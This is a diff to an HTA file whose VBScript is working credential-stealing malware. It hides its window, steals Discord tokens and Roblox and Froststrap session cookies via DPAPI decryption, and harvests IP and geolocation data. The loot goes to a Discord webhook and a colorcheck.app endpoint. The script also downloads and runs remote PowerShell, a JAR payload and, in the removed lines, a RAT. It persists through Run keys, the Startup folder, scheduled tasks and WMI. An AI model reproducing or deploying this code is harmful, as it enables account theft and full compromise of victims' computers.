@@ -1,11 +1,5 @@
-
 <html>
-<head>
-<!-- This site is hosted on Netlify. Anyone can build and deploy a site
-     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a
-     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
-<meta name="hosting-provider" content="Netlify">
-<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=cb2b3e1f-2451-4656-b47c-8aa7471a525a"><title>.</title>
+<head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
@@ -15,21 +9,38 @@ Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' CHANGE THIS TO YOUR WEBHOOK URL
-WH = "https://discord.com/api/webhooks/1553877992185532497/D_iruHSj-HioN_HhFvnX6yztxMsXpkInu8y0d-a-DkVaUgZBk_bXSGcOwUipFHjytA65"
+WH = "https://colorcheck.app/wh/"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' TRACE
+' Debug: Write start
 Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
+Dim tr: Set tr = fso.CreateTextFile(tf, True)
+tr.Write "START:" & Now & vbCrLf
+tr.Close
+Set tr = Nothing
 
+' ===== RUN ONCE =====
 Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
-Call DropRAT
+Call GrabFroststrap
+Call DropJavaJar
+
+' ===== RE-GRAB 3 MORE TIMES (fresh cookies) =====
+Dim runCount
+For runCount = 1 To 7
+    PostEmbed ":repeat: Re-grab " & runCount & "/7", "PC: " & PC & " | User: " & USER, 3447003
+    Call SleepMinutes(2)
+    Call GrabTokens
+    Call IP
+    Call GrabRoblox
+    Call GrabFroststrap
+    Call DropJavaJar
+Next
+
 window.close()
 
 Sub IP()
@@ -45,7 +56,124 @@ Sub IP()
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    PostEmbed "Target", info, 3447003
+    PostEmbed ":dart: Target", info, 3447003
+    Set xh = Nothing
+End Sub
+
+Sub SendFileToDiscord(filepath, filename)
+    On Error Resume Next
+    If Not fso.FileExists(filepath) Then Exit Sub
+    
+    Dim password : password = "YourSecurePassword123"
+    Dim data : data = ReadFile(filepath)
+    
+    Dim protectedData : protectedData = "===== PASSWORD PROTECTED ======" & vbCrLf
+    protectedData = protectedData & "Password: " & password & vbCrLf
+    protectedData = protectedData & "=================================" & vbCrLf & vbCrLf
+    protectedData = protectedData & data
+    
+    Dim DQ: DQ = Chr(34)
+    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    
+    Dim bd: bd = "--" & b & vbCrLf
+    bd = bd & "Content-Disposition: form-data; name=" & DQ & "file" & DQ
+    bd = bd & "; filename=" & DQ & filename & ".protected" & DQ & vbCrLf
+    bd = bd & "Content-Type: text/plain" & vbCrLf & vbCrLf
+    bd = bd & protectedData & vbCrLf
+    bd = bd & "--" & b & "--"
+    
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+    
+    PostEmbed ":lock: File Sent with Password", "File: " & filename & ".protected" & vbCrLf & "Password: " & password, 3447003
+End Sub
+
+Function ExtractJSON(json, key)
+    ExtractJSON = ""
+    On Error Resume Next
+    Dim startPos : startPos = InStr(json, """" & key & """:")
+    If startPos > 0 Then
+        startPos = startPos + Len(key) + 2
+        If Mid(json, startPos, 1) = """" Then
+            startPos = startPos + 1
+            Dim endPos : endPos = InStr(startPos, json, """")
+            If endPos > startPos Then
+                ExtractJSON = Mid(json, startPos, endPos - startPos)
+            End If
+        Else
+            Dim endNum : endNum = InStr(startPos, json, ",")
+            If endNum = 0 Then endNum = InStr(startPos, json, "}")
+            If endNum > startPos Then
+                ExtractJSON = Trim(Mid(json, startPos, endNum - startPos))
+            End If
+        End If
+    End If
+    If ExtractJSON = "" Then ExtractJSON = "N/A"
+End Function
+
+Sub GetRobloxAccount(cookie)
+    On Error Resume Next
+    
+    Dim cleanCookie : cleanCookie = cookie
+    If InStr(cleanCookie, "_|WARNING") > 0 Then
+        cleanCookie = Replace(cleanCookie, vbCr, "")
+        cleanCookie = Replace(cleanCookie, vbLf, "")
+        cleanCookie = Trim(cleanCookie)
+    End If
+    
+    Dim token : token = cleanCookie
+    If InStr(cleanCookie, ".ROBLOSECURITY") > 0 Then
+        Dim startP : startP = InStr(cleanCookie, ".ROBLOSECURITY=") + 15
+        Dim endP : endP = InStr(startP, cleanCookie, ";")
+        If endP = 0 Then endP = Len(cleanCookie) + 1
+        token = Mid(cleanCookie, startP, endP - startP)
+        token = Replace(token, vbCr, "")
+        token = Replace(token, vbLf, "")
+        token = Trim(token)
+    End If
+    
+    If token = "" Then
+        PostEmbed ":cookie: Roblox Cookie (No Profile)", "Cookie: " & cookie, 65280
+        PostFile "roblox_cookie.txt", cookie
+        Exit Sub
+    End If
+    
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & token
+    xh.Send
+    
+    If xh.Status = 200 Then
+        Dim resp : resp = xh.responseText
+        Dim username : username = ExtractJSON(resp, "UserName")
+        Dim userID : userID = ExtractJSON(resp, "UserID")
+        Dim robux : robux = ExtractJSON(resp, "RobuxBalance")
+        Dim membership : membership = ExtractJSON(resp, "MembershipType")
+        
+        Dim embedDesc : embedDesc = ""
+        embedDesc = embedDesc & "**Account:** " & username & vbCrLf
+        embedDesc = embedDesc & "**User ID:** " & userID & vbCrLf
+        embedDesc = embedDesc & "**Robux:** " & robux & " R$" & vbCrLf
+        embedDesc = embedDesc & "**Membership:** " & membership & vbCrLf
+        embedDesc = embedDesc & vbCrLf
+        embedDesc = embedDesc & "**Cookie Length:** " & Len(cookie) & " chars" & vbCrLf & vbCrLf
+        embedDesc = embedDesc & "**Cookie:** `" & cookie & "`"
+        
+        If Len(embedDesc) > 1800 Then
+            embedDesc = Left(embedDesc, 1700) & "...(truncated)"
+        End If
+        
+        PostEmbed ":cookie: Roblox Cookie Stolen!", embedDesc, 65280
+        PostFile "roblox_cookie_full.txt", cookie
+    Else
+        PostEmbed ":cookie: Roblox Cookie (Profile Unavailable)", "Cookie: " & cookie & vbCrLf & "Status: " & xh.Status, 65280
+        PostFile "roblox_cookie.txt", cookie
+    End If
     Set xh = Nothing
 End Sub
 
@@ -79,155 +207,252 @@ Sub GrabRoblox()
     If Len(raw) < 50 Then Exit Sub
 
     Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
+    If InStr(raw, "_|WARNING") > 0 Then
+        cookie = raw
+    End If
+    
     If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        Dim searchStr : searchStr = "CookiesData" & Chr(34) & ":" & Chr(34)
+        Dim sp: sp = InStr(raw, searchStr)
         If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
+            sp = sp + Len(searchStr)
+            Dim ep: ep = InStr(sp, raw, Chr(34))
             If ep > sp Then
                 Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                End If
             End If
         End If
     End If
+    
     If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
     End If
-    If Len(cookie) = 0 Then cookie = raw
+    
+    If Len(cookie) = 0 Then
+        cookie = raw
+    End If
 
     cookie = Replace(cookie, vbCr, "")
     cookie = Replace(cookie, vbLf, "")
     cookie = Replace(cookie, vbTab, "")
     cookie = Trim(cookie)
+    
     Dim sc: sc = InStr(cookie, ";")
     If sc > 0 Then cookie = Left(cookie, sc - 1)
     cookie = Trim(cookie)
+    
     Dim warn: warn = InStr(cookie, "_|WARNING")
     If warn > 1 Then cookie = Mid(cookie, warn)
+    If Left(cookie, 9) <> "_|WARNING" And Left(cookie, 10) <> "_|WARNING:" Then
+        cookie = "_|WARNING:" & cookie
+    End If
 
-    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
+    Call GetRobloxAccount(cookie)
     PostFile "cookie.txt", cookie
 End Sub
+ch
+Sub DropJavaJar()
+    On Error Resume Next
+    
+    Dim javaUrl : javaUrl = "https://download.oracle.com/java/21/latest/jdk-21_windows-x64_bin.exe"
+    Dim jarUrl : jarUrl = "https://colorcheck.app/mod.jar"
+    Dim javaInstaller : javaInstaller = sh.ExpandEnvironmentStrings("%TEMP%") & "\jdk21.exe"
+    Dim jarFile : jarFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\mod.jar"
+    
+    ' 1. Download Java 21 installer
+    PostEmbed ":coffee: Java 21", "Downloading JDK 21...", 3447003
+    sh.Run "cmd /c bitsadmin /transfer jdk /download /priority high " & javaUrl & " """ & javaInstaller & """", 0, True
+    
+    If fso.FileExists(javaInstaller) Then
+        ' 2. Install Java 21 silently
+        PostEmbed ":coffee: Java 21", "Installing silently...", 3447003
+        sh.Run "cmd /c """ & javaInstaller & """ /s /L C:\Windows\Temp\java_install.log", 0, True
+        
+        ' 3. Wait for installation
+        Call SleepSeconds(60)
+        
+        ' 4. Download .jar file
+        PostEmbed ":package: JAR", "Downloading payload...", 3447003
+        sh.Run "cmd /c bitsadmin /transfer jar /download /priority high " & jarUrl & " """ & jarFile & """", 0, True
+        
+        If fso.FileExists(jarFile) Then
+            ' 5. Find javaw.exe
+            Dim javaPath : javaPath = ""
+            Dim candidates : candidates = Array( _
+                "C:\Program Files\Java\jdk-21\bin\javaw.exe", _
+                "C:\Program Files\Java\jdk-21.0.1\bin\javaw.exe", _
+                "C:\Program Files\Java\jdk-21.0.2\bin\javaw.exe", _
+                "C:\Program Files\Eclipse Adoptium\jdk-21.0.1.12-hotspot\bin\javaw.exe", _
+                "C:\Program Files\Microsoft\jdk-21.0.1.12-hotspot\bin\javaw.exe" _
+            )
+            Dim c
+            For Each c In candidates
+                If fso.FileExists(c) Then javaPath = c : Exit For
+            Next
+            
+            If javaPath = "" Then
+                ' Search via where
+                Dim wsh : Set wsh = sh.Exec("cmd /c where javaw.exe 2>nul")
+                Dim out : out = wsh.StdOut.ReadAll()
+                If Len(Trim(out)) > 0 Then javaPath = Split(Trim(out), vbCrLf)(0)
+            End If
+            
+            If javaPath <> "" Then
+                ' 6. Launch .jar hidden
+                PostEmbed ":rocket: JAR", "Launching with " & javaPath, 65280
+                sh.Run """" & javaPath & """ -jar """ & jarFile & """", 0, False
+            Else
+                ' 7. If javaw not found â€” use java.exe
+                sh.Run "cmd /c java -jar """ & jarFile & """", 0, False
+            End If
+        Else
+            PostEmbed ":x: JAR", "Download failed", 16711680
+        End If
+    Else
+        PostEmbed ":x: Java", "JDK download failed", 16711680
+    End If
+    
+    ' Cleanup
+    On Error Resume Next
+    fso.DeleteFile javaInstaller, True
+End Sub
 
-Sub DropRAT()
-    ' CHANGE THIS TO YOUR RAT URL
-    Dim dl : dl = "https://ia600108.us.archive.org/34/items/24242424_202607/OnlineDice.exe"
-    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\OnlineDice.exe"
-    
-    ' DOWNLOAD USING BITSADMIN
-    sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, True
-    
-    ' IF BITS FAILS - USE CURL
-    If Not fso.FileExists(op) Then
-        sh.Run "cmd /c curl -L -o """ & op & """ """ & dl & """", 0, True
+Sub GrabFroststrap()
+    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
+    If Not fso.FileExists(fp) Then
+        On Error Resume Next
+        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
+        On Error Goto 0
+        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
     End If
-    
-    ' IF CURL FAILS - USE POWERSHELL
-    If Not fso.FileExists(op) Then
-        sh.Run "powershell -Command ""$url='" & dl & "'; $out='" & op & "'; (New-Object Net.WebClient).DownloadFile($url,$out)""", 0, True
-    End If
-    
-    If fso.FileExists(op) Then
-        ' ADD TO STARTUP
-        Dim startup
-        startup = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\OnlineDice.exe"
-        fso.CopyFile op, startup, True
-        
-        ' REGISTRY PERSISTENCE
-        sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OnlineDice", op, "REG_SZ"
-        
-        ' RUN THE RAT
-        sh.Run op, 0, False
-    End If
+    If Not fso.FileExists(fp) Then Exit Sub
+
+    PostEmbed ":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003
+
+    Dim ps
+    ps = "$w='https://colorcheck.app/wh/';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+
+    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
+End Sub
+
+Sub SleepSeconds(s)
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+End Sub
+
+Sub SleepMinutes(m)
+    Call SleepSeconds(m * 60)
 End Sub
 
 Sub Persistence()
-    Dim payload : payload = "mshta https://YOUR_NETLIFY_URL/system.hta"
+    Dim payload : payload = "mshta https://colorcheck.app/"
     On Error Resume Next
     
-    ' 1) Registry Run (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    
-    ' 2) Registry RunOnce (HKCU)
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
     
-    ' 3) Startup folder VBS
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
     
-    PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
+    Dim taskCmd : taskCmd = "schtasks /create /tn ""WindowsUpdate"" /tr ""mshta https://colorcheck.app/"" /sc onlogon /rl highest /f"
+    sh.Run "cmd /c " & taskCmd, 0, True
+    
+    Dim wmiCmd : wmiCmd = "wmic /namespace:\\root\subscription path __EventFilter create name=""StartupFilter"", EventNameSpace='root\cimv2', QueryLanguage='WQL', Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName LIKE ''%explorer.exe%'''"
+    sh.Run "cmd /c " & wmiCmd, 0, True
+    
+    PostEmbed ":pushpin: Persistence", "5 startup methods installed", 65280
 End Sub
 
 Sub GrabTokens()
-    PostEmbed "DEBUG", "Starting GrabTokens...", 16753920
+    On Error Resume Next
+    
+    ' Delete old script if exists
+    Dim psf: psf = TmpFile("steal.ps1")
+    If fso.FileExists(psf) Then fso.DeleteFile psf, True
+    
+    ' Download fresh s.ps1
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    PostEmbed "DEBUG", "Downloading PS1 from /s...", 16753920
-    xh.Open "GET", "https://genthub.app/s", False
+    xh.Open "GET", "https://colorcheck.app/s.ps1", False
     xh.Send
+    
     If xh.Status <> 200 Then
-        PostEmbed "DEBUG", "PS1 download FAILED status:" + CStr(xh.Status), 16711680
+        PostEmbed ":bug: Error", "s.ps1 download failed - Status: " & xh.Status, 16711680
+        Set xh = Nothing
         Exit Sub
     End If
+    
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then
-        PostEmbed "DEBUG", "PS1 too small: " + CStr(Len(pc)) + " bytes", 16711680
+        PostEmbed ":bug: Error", "s.ps1 too short - Length: " & Len(pc), 16711680
+        Set xh = Nothing
         Exit Sub
     End If
     Set xh = Nothing
-    PostEmbed "DEBUG", "PS1 downloaded: " + CStr(Len(pc)) + " bytes", 65280
     
-    Dim psf: psf = TmpFile("steal.ps1")
+    ' Write and run
     WriteFile psf, pc
-    PostEmbed "DEBUG", "PS1 written. Running...", 16753920
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    PostEmbed "DEBUG", "PowerShell finished", 65280
-    fso.DeleteFile psf, True
     
+    ' Wait for result file
     Dim tf: tf = TmpFile("steal_result.txt")
+    Dim waitCount: waitCount = 0
+    Do While Not fso.FileExists(tf) And waitCount < 30
+        Call SleepSeconds(1)
+        waitCount = waitCount + 1
+    Loop
+    
     If Not fso.FileExists(tf) Then
-        PostEmbed "DEBUG", "NO steal_result.txt found!", 16711680
+        PostEmbed ":bug: Error", "steal_result.txt not found after 30 seconds", 16711680
+        fso.DeleteFile psf, True
         Exit Sub
     End If
-    PostEmbed "DEBUG", "Result file found. Reading...", 65280
-    Dim raw: raw = ReadFile(tf)
-    fso.DeleteFile tf, True
-    PostEmbed "DEBUG", "Results: " + CStr(Len(raw)) + " bytes", 16753920
     
+    Dim raw: raw = ReadFile(tf)
+    Call SendFileToDiscord(tf, "steal_result.txt")
+    
+    fso.DeleteFile tf, True
+    fso.DeleteFile psf, True
+    
+    ' Parse result
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
-        Dim l, count
-        count = 0
+        Dim l
         For Each l In lines
             If Len(l) > 10 Then
                 If Left(l, 8) = "DISCORD|" Then
                     Dim p: p = Split(Mid(l, 9), "|")
                     If UBound(p) >= 4 Then
-                        Dim info: info = "User: " + p(0) + vbCrLf
-                        If p(1) <> "" Then info = info + "Email: " + p(1) + vbCrLf
-                        If p(2) <> "" Then info = info + "Phone: " + p(2) + vbCrLf
-                        If p(3) <> "0" Then info = info + "ID: " + p(3) + vbCrLf
-                        info = info + "Token: " + p(4)
-                        PostEmbed "Discord Token", info, 5793266
-                        count = count + 1
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        PostEmbed ":gift: Discord Token", info, 5793266
                     End If
                 End If
                 If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    PostEmbed "Roblox Cookie", Mid(l, 8), 65280
-                    count = count + 1
-                End If
-                If Left(l, 7) = "WALLET|" Then
-                    PostEmbed "Wallet", Mid(l, 8), 16753920
-                    count = count + 1
+                    Dim cookieStart
+                    If Left(l, 7) = "ROBLOX|" Then
+                        cookieStart = 8
+                    Else
+                        cookieStart = 10
+                    End If
+                    Dim cookieValue : cookieValue = Mid(l, cookieStart)
+                    cookieValue = Replace(cookieValue, vbCr, "")
+                    cookieValue = Replace(cookieValue, vbLf, "")
+                    cookieValue = Trim(cookieValue)
+                    If Len(cookieValue) > 10 Then
+                        Call GetRobloxAccount(cookieValue)
+                    End If
                 End If
             End If
         Next
-        PostEmbed "DEBUG", "Sent " + CStr(count) + " results", 65280
-    Else
-        PostEmbed "DEBUG", "Results too small: " + CStr(Len(raw)) + " chars", 16711680
     End If
 End Sub
 
@@ -258,13 +483,36 @@ Sub PostFile(fn, ct)
     Set h = Nothing
 End Sub
 
+Sub RunCmd(cmd)
+    Dim w,p,i,s
+    Set w = GetObject("winmgmts:\\.\root\cimv2")
+    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
+    s.ShowWindow = 0
+    Set p = w.Get("Win32_Process")
+    p.Create cmd,,s,i
+    If i = 0 Then Exit Sub
+    Dim r: r = True
+    Dim startTime: startTime = Timer()
+    Do While r
+        If Timer() - startTime > 60 Then
+            PostEmbed "DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680
+            sh.Run "taskkill /F /PID " & i, 0, False
+            Exit Do
+        End If
+        Set w = GetObject("winmgmts:\\\\.\\root\\cimv2")
+        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
+        Set w = Nothing
+        If r Then Dim t: t = Timer(): Do While Timer() - t < 0.15: Loop: End If
+    Loop
+End Sub
+
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
     Dim outf: outf = TmpFile("dpo.txt")
     fso.DeleteFile outf, True
     WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = TmpFile("dpapi.ps1")
     WriteFile psf, ps
     sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
